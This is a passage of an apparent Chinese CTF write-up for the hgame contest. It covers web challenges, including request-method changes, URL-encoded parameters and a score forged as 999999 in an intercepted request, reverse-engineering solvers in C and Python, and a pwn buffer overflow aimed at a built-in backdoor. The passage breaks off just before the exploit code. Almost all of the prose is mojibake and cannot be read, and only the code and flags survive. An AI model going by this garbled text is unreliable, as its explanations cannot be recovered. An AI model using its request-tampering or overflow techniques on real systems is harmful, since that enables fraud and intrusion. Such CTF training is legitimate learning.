<p>è€Œä¸”urlæœ¬æ¥æ˜¯<a target="_blank" rel="external nofollow noopener noreferrer" href="http://codeworld.hgame.day-day.work/">http://codeworld.hgame.day-day.work</a>ï¼Œå´å˜æˆ<a target="_blank" rel="external nofollow noopener noreferrer" href="http://codeworld.hgame.day-day.work/new.php">http://codeworld.hgame.day-day.work/new.php</a>ï¼Œé‚£åº”è¯¥æ˜¯è·³è½¬äº†</p>
<p>å¥½åœ¨æˆ‘æœ‰burpsuiteï¼ˆå¤šæ¬¡æ‰“å¹¿å‘Šè¡Œä¸ºï¼‰</p>
<p><img src="/images/20ebc87d/web-3-2.png" alt="2"></p>
<p>å›¾ä¸­çš„æ–‡å­—ä¹Ÿå°è¯äº†æˆ‘çš„æƒ³æ³•ï¼ˆcosmosè¢«é»‘çš„å¥½æƒ¨</p>
<p>é‚£å°±ç›´æ¥è®¿é—®é“¾æ¥<a target="_blank" rel="external nofollow noopener noreferrer" href="http://codeworld.hgame.day-day.work/">http://codeworld.hgame.day-day.work</a>ï¼Œçœ‹çœ‹è·³è½¬å‰éƒ½æœ‰ä»€ä¹ˆ</p>
<p><img src="/images/20ebc87d/web-3-3.png" alt="3"></p>
<p>çœ‹åˆ°è¿™ä¸ªNot Allowedæˆ‘æ‡µäº†å¥½ä¹…ï¼Œéš¾é“æˆ‘é”™äº†ï¼Ÿå¡äº†åŠå¤©å°±å»åšmiscé¢˜äº†ï¼ˆè€Œä¸”è¿˜ä¸€é¢˜æ²¡åšå‡ºæ¥ï¼‰ï¼Œä¸€æ®µæ—¶é—´åçªç„¶æœ‰æƒ³æ³•ï¼Œå»æœäº†ä¸‹405çŠ¶æ€ç æ˜¯ä»€ä¹ˆæ„æ€ï¼Œå‘ç°</p>
<blockquote>
<h3 id="405-Method-Not-Allowed"><a href="#405-Method-Not-Allowed" class="headerlink" title="405 Method Not Allowed"></a>405 Method Not Allowed</h3><p>è¯·æ±‚è¡Œä¸­æŒ‡å®šçš„è¯·æ±‚æ–¹æ³•ä¸èƒ½è¢«ç”¨äºè¯·æ±‚ç›¸åº”çš„èµ„æºã€‚è¯¥å“åº”å¿…é¡»è¿”å›ä¸€ä¸ªAllow å¤´ä¿¡æ¯ç”¨ä»¥è¡¨ç¤ºå‡ºå½“å‰èµ„æºèƒ½å¤Ÿæ¥å—çš„è¯·æ±‚æ–¹æ³•çš„åˆ—è¡¨ã€‚</p>
</blockquote>
<p>åŸæ¥æ˜¯è¯·æ±‚çš„æ–¹æ³•ä¸å¯¹ï¼Œè™½ç„¶è¿”å›åŒ…ä¸­æ²¡æœ‰Allowå¤´å‘Šè¯‰æˆ‘ç”¨ä»€ä¹ˆæ–¹æ³•è¯·æ±‚ï¼Œä½†æœ€å¸¸ç”¨çš„é™¤äº†GETå°±æ˜¯POSTäº†ï¼Œé‚£å°±æ”¹POSTè¯·æ±‚</p>
<p><img src="/images/20ebc87d/web-3-4.png" alt="4"></p>
<p>è¿™é‡Œè¦æäº¤urlå‚æ•°aï¼Œè®¡ç®—ä¸¤ä¸ªæ•°ç›¸åŠ ç»“æœä¸º10ï¼Œä¸€ä¸ªå‚æ•°ä¼ ä¸¤ä¸ªå€¼ï¼Œä¸€æƒ³å°±æƒ³åˆ°phpçš„urlä¼ æ•°ç»„çš„æ–¹å¼</p>
<pre class="line-numbers language-none"><code class="language-none">?a[]&#x3D;1&amp;a[]&#x3D;9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å‘ç°ä¸å¯¹ï¼Œurlç¼–ç åå†æäº¤ï¼Œå‘ç°è¿˜æ˜¯ä¸å¯¹ï¼Œåˆå¡ä½äº†ã€‚ã€‚ã€‚</p>
<p>æœ€åï¼Œæœ‰ä¸ªhintè¯´açš„å‚æ•°çš„æ ¼å¼æ˜¯<code>a=b+c</code>ï¼ˆæ­¤æ—¶å·²ç»æœ‰å¥½å¤šäººè§£å‡ºæ¥äº†ï¼‰ï¼Œæœ€åæäº¤</p>
<pre class="line-numbers language-none"><code class="language-none">?a&#x3D;1%2b9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ï¼ˆ+å·ç¼–ç åä¸º%2bï¼‰</p>
<p><img src="/images/20ebc87d/web-3-5.png" alt="5"></p>
<p>é‚å¾—flagï¼š<code>hgame&#123;C0d3_1s_s0_S@_sO_C0ol!&#125;</code></p>
<hr>
<h3 id="ğŸ”å°¼æ³°ç«"><a href="#ğŸ”å°¼æ³°ç«" class="headerlink" title="ğŸ”å°¼æ³°ç«"></a>ğŸ”å°¼æ³°ç«</h3><p>è¿™æ ‡é¢˜ï¼è¿™ç•Œé¢ï¼</p>
<p><img src="/images/20ebc87d/web-4-1.png" alt="1"></p>
<p>å¾‹å¸ˆå‡½è­¦å‘Šï¼Ÿï¼</p>
<p>å’³å’³ï¼</p>
<p>æœ€ä¸‹é¢é‚£è¡Œå­—è¯´ï¼Œåªè¦åˆ†å¤Ÿï¼Œflagå°½ç®¡æ‹¿ï¼Œå½“ç„¶æ˜¯å¼€æŒ‚å•¦ï¼Œå¼€ç€burpsuiteæŠ“åŒ…ï¼Œå…ˆç©ä¸€éï¼ˆç©ç€ç©ç€å¿˜äº†æˆ‘åœ¨åšctfé¢˜ï¼‰</p>
<p>å‘ç°æœ‰ä¸€ä¸ªè¯·æ±‚åŒ…å‘é€äº†åˆ†æ•°</p>
<p><img src="/images/20ebc87d/web-4-2.png" alt="2"></p>
<p>ï¼ˆä¸æ˜¯æˆ‘ï¼åˆ«é—®äº†ï¼æˆ‘æ€ä¹ˆå¯èƒ½åªæœ‰500åˆ†ï¼ï¼‰</p>
<p>ä¹Ÿä¸çŸ¥é“<code>|</code>åé¢é‚£ä¸ªæ˜¯ä»€ä¹ˆï¼Œå…ˆæ”¹äº†åˆ†æ•°æˆ999999</p>
<p><img src="/images/20ebc87d/web-4-3.png" alt="3"></p>
<p>å˜»å˜»ï¼Œæˆäº†ï¼flagï¼š<code>hgame&#123;j4vASc1pt_w1ll_tel1_y0u_someth1n9_u5efu1?!&#125;</code></p>
<p>ï¼ˆåšå®Œåå‘ç°flagä¸­æœ‰æç¤ºjavascriptçš„ï¼Œçœ‹äº†ä¸‹jsæ–‡ä»¶ï¼Œå‘ç°scoreå‚æ•°å­—ç¬¦<code>|</code>åé¢é‚£ä¸ªæ˜¯æ—¶é—´æˆ³çš„md5å€¼ï¼Œæ²¡ä»€ä¹ˆå½±å“ï¼‰</p>
<hr>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h3><p>æ‹–å…¥idaï¼Œf5åæ±‡ç¼–ï¼Œç®€å•å¤„ç†ä¸€ä¸‹å</p>
<p><img src="/images/20ebc87d/re-1-1.png" alt="1"></p>
<p>è¿·å®«ç±»é¢˜ç›®ï¼Œ<code>wsad</code>ä¸ºä¸Šä¸‹å·¦å³ï¼Œå›¾ä¸­çš„v5ä»£è¡¨å½“å‰ä½ç½®ï¼Œæ°´å¹³æ–¹å‘ç§»åŠ¨4ä¸ªå­—èŠ‚ï¼Œä¸€è¡Œæœ‰64ä¸ªå­—èŠ‚</p>
<p><img src="/images/20ebc87d/re-1-2.png" alt="2"></p>
<p>å¯ä»¥ç›´åˆ°<code>unk_602080</code>å’Œ<code>unk_60247C</code>æ˜¯åœ°å›¾çš„è¾¹ç•Œäº†ï¼Œä¸”1ä¸ºä¸å¯èµ°ï¼Œæˆ‘çš„åšæ³•æ˜¯æŠŠæ•°æ®å¯¼ï¼ˆè‡³äºæ€ä¹ˆå¯¼å‡ºæŸ¥èµ„æ–™ï¼‰å‡ºæ¥ï¼Œ1ç”¨å­—ç¬¦<code>#</code>æ‰“å°ï¼Œ0ç”¨ç©ºæ ¼æ‰“å°ï¼Œç”»å‡ºåœ°å›¾æ¥èµ°è¿·å®«ï¼Œåšæ˜¯åšå‡ºæ¥äº†ï¼Œæœ‰ç‚¹éº»çƒ¦ï¼Œå¦‚ä¸‹å›¾</p>
<p><img src="/images/20ebc87d/re-1-3.png" alt="3"></p>
<p>å…¶ä¸­çš„<code>x</code>æ˜¯æˆ‘æ ‡è®°çš„èµ·ç‚¹å’Œç»ˆç‚¹ã€‚è¿™æ ·åšå¾ˆéº»çƒ¦ï¼Œæˆ‘ä¹Ÿä¸è¯¦ç»†è®²äº†ï¼Œåšå®Œåå­¦é•¿æç¤ºï¼ŒæŠŠ4ä¸ªå­—èŠ‚çœ‹æˆä¸€ä¸ªå•ä½ä¼šæ¯”è¾ƒç®€å•ï¼Œå‘ƒï¼Œå½“æˆ‘çœ‹åˆ°ä¸Šä¸Šå›¾ä¸­çš„<code>*(_DWORD *)v5 &amp; 1</code>çš„æ—¶å€™ï¼Œæˆ‘å±…ç„¶æ²¡å‘ç°è¿™ä¸ªé—®é¢˜ï¼Ÿï¼</p>
<p>é‚£ä¹ˆå°±æŒ‰ç…§4å­—èŠ‚ä¸€ä¸ªå•ä½å¯¼å‡ºåï¼Œæœ€ä½ä½ä¸º1çš„ç”»æˆ<code>#</code>ï¼Œå…¶ä½™ç”»æˆç©ºæ ¼ï¼Œåœ°å›¾å¦‚ä¸‹ï¼š</p>
<p><img src="/images/20ebc87d/re-1-4.png" alt="4"></p>
<p>è¿™æ ·ç®€å•å¤šäº†ï¼Œflagï¼š<code>hgame&#123;ssssddddddsssssddwwdddssssdssdd&#125;</code></p>
<hr>
<h3 id="bitwise-operation2"><a href="#bitwise-operation2" class="headerlink" title="bitwise_operation2"></a>bitwise_operation2</h3><p>é¦–å…ˆï¼Œæ‹–å…¥idaï¼Œæ‰¾åˆ°mainå‡½æ•°åæ±‡ç¼–</p>
<p><img src="/images/20ebc87d/re-2-1.png" alt="1"></p>
<p>çº¢æ¡†å¯ä»¥çœ‹åˆ°ï¼Œå†åŠ ä¸Šåé¢æœ‰ä¸ªå¼‚æˆ–æ“ä½œï¼Œè€Œä¸”è¿™æ ·çš„è®¿é—®æ–¹å¼æ­ç¤ºäº†æ˜¯v6,v7,â€¦,v13æ˜¯ä¸ªæ•°ç»„ï¼Œå¯ä»¥ä¿®æ”¹ä¸€ä¸‹å˜é‡çš„å®šä¹‰ï¼š</p>
<p><img src="/images/20ebc87d/re-2-2.png" alt="2"></p>
<p><img src="/images/20ebc87d/re-2-3.png" alt="3"></p>
<p>ç±»ä¼¼çš„æ“ä½œï¼ˆå…¶ä½™ä¿®æ”¹å˜é‡å‡½æ•°åï¼Œä¿®æ”¹ç±»å‹ä»€ä¹ˆçš„å¯ä»¥è‡ªå·±æŸ¥èµ„æ–™å­¦ä¹ ä¸‹ï¼‰ï¼Œåˆ†æå®Œåå¦‚ä¸‹ï¼š</p>
<p><img src="/images/20ebc87d/re-2-4.png" alt="4"></p>
<p><img src="/images/20ebc87d/re-2-5.png" alt="5"></p>
<p>åŠ ä¸Šæˆ‘çš„æ³¨é‡Šåº”è¯¥å¾ˆæ˜äº†ï¼Œå€’æ¨flag1,flag2ç„¶åå€’æ¨flagå°±å¥½ï¼Œexpå¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>

<span class="token keyword">typedef</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> byte<span class="token punctuation">;</span>

byte key<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">52</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
byte arr1<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"e4sy_Re_"</span><span class="token punctuation">;</span>
byte arr2<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Easylif3"</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> byte <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token comment">//å¾—åˆ°ç¬¬ä¸€ä¸ªforå¾ªç¯åçš„flag1,flag2</span>
    byte flag1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> flag2<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
        flag1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> arr1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
        flag2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> arr2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> arr1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    
    <span class="token comment">//forå¾ªç¯å‰çš„flag1å’Œflag2</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span> <span class="token comment">//å†äº¤æ¢ä¸€æ¬¡ä¸å°±æ¢å›æ¥äº†å’¯</span>
        flag1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> flag1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x55</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>flag2<span class="token punctuation">[</span><span class="token number">7</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xAA</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span> flag1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xAA</span><span class="token punctuation">;</span>
        flag2<span class="token punctuation">[</span><span class="token number">7</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span>flag1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x55</span><span class="token punctuation">)</span> <span class="token operator">^</span> flag2<span class="token punctuation">[</span><span class="token number">7</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xAA</span> <span class="token operator">|</span> flag2<span class="token punctuation">[</span><span class="token number">7</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x55</span><span class="token punctuation">;</span>
        flag1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> flag1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x55</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>flag2<span class="token punctuation">[</span><span class="token number">7</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xAA</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span> flag1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xAA</span><span class="token punctuation">;</span>

        <span class="token comment">//è®°å¾—è¿™ä¸ªæ­¥éª¤</span>
        flag1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>flag1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>flag1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">//å¾—åˆ°flag</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hgame&#123;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        uint ch <span class="token operator">=</span> flag1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02x"</span><span class="token punctuation">,</span> ch<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        uint ch <span class="token operator">=</span> flag2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02x"</span><span class="token punctuation">,</span> ch<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"&#125;\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿è¡Œç¨‹åºå¾—flagï¼š<code>hgame&#123;0f233e63637982d266cbf41ecb1b0102&#125;</code></p>
<hr>
<h3 id="advance"><a href="#advance" class="headerlink" title="advance"></a>advance</h3><p>å¸¸è§„æ“ä½œï¼Œæˆ‘ä¹Ÿå†™äº†æ³¨é‡Šï¼Œæ”¹äº†å˜é‡åå’Œå‡½æ•°å</p>
<p><img src="/images/20ebc87d/re-3-1.png" alt="1"></p>
<p>ä¸‹é¢é‚£ä¸ªstrncmpçš„å­—ç¬¦ä¸²ä¸€å¼€å§‹æˆ‘æ•°äº†ä¸‹é•¿åº¦ï¼Œæ˜¯4çš„å€æ•°ï¼Œé‚£æ—¶å€™å¼€å§‹æˆ‘å°±çŒœæ˜¯base64ç¼–ç äº†ï¼Œä½†æ˜¯ç›´æ¥è§£å¯†ä¸å¤ªå¯¹ã€‚åœ¨encryptå‡½æ•°é‡Œï¼ˆè¿™ä¸ªåå­—å½“ç„¶æ˜¯æˆ‘è‡ªå·±æ”¹çš„ï¼‰å‘ç°</p>
<p><img src="/images/20ebc87d/re-3-2.png" alt="2"></p>
<p><img src="/images/20ebc87d/re-3-3.png" alt="3"></p>
<p>æŸ¥è¿‡base64çš„åŸç†ï¼ŒçŸ¥é“æœ‰ä¸€ä¸ªç¼–ç è¡¨çš„ï¼Œé‚£ä¹ˆè¿™é‡Œåº”è¯¥æ˜¯æŠŠæ ‡å‡†çš„è¡¨æ¢æˆè¿™é‡Œçš„è¡¨æ¥ç¼–ç çš„ï¼Œé‚£è§£å¯†çš„æ—¶å€™å…ˆæŠŠå­—ç¬¦æ¢å›æ¥å†è§£å¯†ï¼Œpython3çš„expå¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python3</span>
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> string

<span class="token comment"># å¾…è§£å¯†è„šæœ¬</span>
str1 <span class="token operator">=</span> <span class="token string">"0g371wvVy9qPztz7xQ+PxNuKxQv74B/5n/zwuPfX"</span>

<span class="token comment"># é¢˜ç›®ä¸­çš„è¡¨</span>
string1 <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>

<span class="token comment"># åŸbase64çš„è¡¨</span>
string2 <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>

<span class="token comment"># å…ˆæŠŠç¼–ç åçš„å­—ç¬¦ä¸²str1çš„å­—ç¬¦ä¸€ä¸€å¯¹åº”å›åŸbase64è¡¨çš„å­—ç¬¦å†è§£ç </span>
<span class="token keyword">print</span> <span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>str1<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>string1<span class="token punctuation">,</span>string2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¾—åˆ°flagï¼š<code>hgame&#123;b45e6a_i5_50_eazy_6VVSQ&#125;</code></p>
<hr>
<h3 id="cpp"><a href="#cpp" class="headerlink" title="cpp"></a>cpp</h3><p><strong>æ³¨æ„ï¼šæœ¬é¢˜æœ‰å¤§é‡çš„çŒœæµ‹</strong></p>
<p>è¿è¡Œè¿‡ä¸€éåï¼Œå‘ç°è¾“å…¥é”™è¯¯ä¼šæ˜¾ç¤º<code>error</code>ï¼Œé‚£ä¹ˆæ‹–å…¥idaï¼Œ<kbd>Alt</kbd>+<kbd>F4</kbd>æœç´¢â€errorâ€å­—ç¬¦ä¸²å¯ä»¥æ‰¾åˆ°mainå‡½æ•°ã€‚</p>
<p><img src="/images/20ebc87d/re-4-1.png" alt="1"></p>
<p>é¦–å…ˆçœ‹åˆ°çš„æ˜¯std::cinï¼Œå¤§èƒ†çŒœæµ‹è¿™ä¸ªæ“ä½œç›¸å½“äº<code>std::cin &gt;&gt; v16</code>ï¼Œå…ˆè¿›å»<code>sub_140002AE0</code>å‡½æ•°åˆ†æäº†ä¸€æ³¢ï¼Œæ²¡æ€ä¹ˆçœ‹æ‡‚ï¼Œè€Œä¸”æœ‰å¾ˆå¤šæ— æ„ä¹‰çš„ä»£ç ã€‚ç„¶åè‡ªå·±å†™äº†æ®µc++ä»£ç ï¼Œå¤§æ¦‚å¦‚ä¸‹</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;
#include &lt;string&gt;

int main()
&#123;
    string s;
    std::cin &gt;&gt; s;
    return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç¼–è¯‘åæ‹–å…¥idaåæ±‡ç¼–ï¼Œå‘ç°æœ‰å’Œçº¢æ¡†ä¸­ç›¸ä¼¼çš„ä»£ç ï¼Œäºæ˜¯å¤§èƒ†çŒœæµ‹ï¼Œ<code>sub_140002AE0</code>å‡½æ•°æ˜¯stringç±»çš„æ„é€ å‡½æ•°ï¼Œé¡ºä¾¿ä¹ŸçŒœæµ‹åˆ°äº†ä¸€ä¸ªvectorç±»ï¼Œè¿˜æœ‰ä¸€äº›ç±»çš„æ–¹æ³•ï¼ˆå¹¸å¥½æˆ‘æœ‰ç‚¹c++åŸºç¡€ï¼‰ï¼Œåˆ†æå®Œåå¤§æ¦‚æ˜¯è¿™æ ·çš„ï¼š</p>
<p><img src="/images/20ebc87d/re-4-2.png" alt="2"></p>
<p><img src="/images/20ebc87d/re-4-3.png" alt="3"></p>
<p>ï¼ˆå¯ä»¥å‘ç°æˆ‘çš„æ³¨é‡Šé‡Œå……æ»¡äº†<strong>â€œå¯èƒ½â€</strong>ï¼Œ<strong>â€œåº”è¯¥â€</strong>ï¼‰</p>
<p>çœ‹åˆ°é‚£ä¸‰å±‚å¾ªç¯ï¼Œå’Œæˆ‘ä¹‹å‰å†™è¿‡çš„çŸ©é˜µä¹˜æ³•å¾ˆåƒï¼Œå†åŠ ä¸Šhintè¯´è®©æˆ‘ç¿»å¼€çº¿ä»£è¯¾æœ¬ï¼Œè´¯ç©¿çº¿ä»£è¯¾æœ¬çš„é™¤äº†çŸ©é˜µè¿˜æ˜¯çŸ©é˜µï¼Œé‚£ä¹ˆå¯ä»¥è‚¯å®šè¿™å°±æ˜¯ä¸ªçŸ©é˜µä¹˜æ³•ã€‚</p>
<p>å’Œæˆ‘æ·»åŠ çš„æ³¨é‡Šä¸€æ ·ï¼Œ<code>rect_input * rect1 = rect2</code>è¿™ä¸ªrect_input æ˜¯è¾“å…¥ï¼Œæ ¼å¼æ˜¯<code>hgame&#123;r11_r12_r13_r20_r21_..._r33&#125;</code>ï¼Œr11è¡¨ç¤ºè¿™æ˜¯çŸ©é˜µçš„ç¬¬(1, 1)ä¸ªå…ƒç´ </p>
<p>é‚£ç®€å•äº†ï¼Œè§£çŸ©é˜µæ–¹ç¨‹å°±å¥½ï¼Œæ‰¾äº†ä¸ªåœ¨çº¿ç½‘ç«™æ±‚rect1çš„é€†ï¼Œæ ¹æ®æˆ‘çš„åˆ†æ<code>rect1[0][1]</code>è¿™ä¸ªå…ƒç´ æœªçŸ¥ï¼Œç›²çŒœ0ï¼ˆå…¶å®ä¹Ÿä¸æ˜¯ç›²çŒœï¼Œå› ä¸ºæˆ‘è¯•äº†å¥½å¤šï¼Œå‘ç°rect1çš„é€†éƒ½æœ‰å°æ•°ï¼Œåªæœ‰0çš„æ—¶å€™ç»“æœæ˜¯æ•´æ•°ï¼‰</p>
<p>æœ€åè§£å‡ºçŸ©é˜µinputå†™æˆflagå°±è¡Œï¼š<code>hgame&#123;-24840_-78193_51567_2556_-26463_26729_3608_-25933_25943&#125;</code></p>
<hr>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h3><p>çœ‹ä¸‹å›¾</p>
<p><img src="/images/20ebc87d/pwn-1-1.png" alt="1"></p>
<p><img src="/images/20ebc87d/pwn-1-2.png" alt="2"></p>
<p>ç›´æ¥æä¾›äº†ä¸€ä¸ªåé—¨ï¼Œåªè¦é‚£ä¹ˆmemcmpè¿”å›å€¼ä¸º0å³å¯getshellã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œmemcmpè¿™ä¸ªå‡½æ•°æ˜¯é€å­—èŠ‚æ¯”è¾ƒï¼Œç›¸ç­‰æ‰è¿”å›0ï¼Œè¿™é‡Œæ˜¯æ¯”è¾ƒ7ä¸ªå­—èŠ‚ï¼ˆç¬¬ä¸‰ä¸ªå‚æ•°ï¼‰ï¼Œä½†æ˜¯è¿™ä¸ªâ€0O0oâ€åªçœ‹åˆ°4ä¸ªå­—èŠ‚+1ä¸ª\0ï¼ˆç»“æŸç¬¦ï¼‰ï¼Œè¿˜æœ‰2ä¸ªå­—èŠ‚ä¸çŸ¥é“ï¼Œé‚£ä¹ˆåŒå‡»è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œå¯çœ‹åˆ°ï¼Œå‰©ä¸‹ä¸¤ä¸ªå­—èŠ‚æ˜¯<code>O0</code></p>
<p><img src="/images/20ebc87d/pwn-1-3.png" alt="3"></p>
<p>åªè¦æº¢å‡ºï¼ŒæŠŠv5åœ°å€å¤„å¼€å§‹è¦†ç›–æˆ<code>0O0o</code> + \0 + <code>O0</code>è¿™7ä¸ªå­—èŠ‚å³å¯ï¼Œexpå¦‚ä¸‹ï¼š</p>
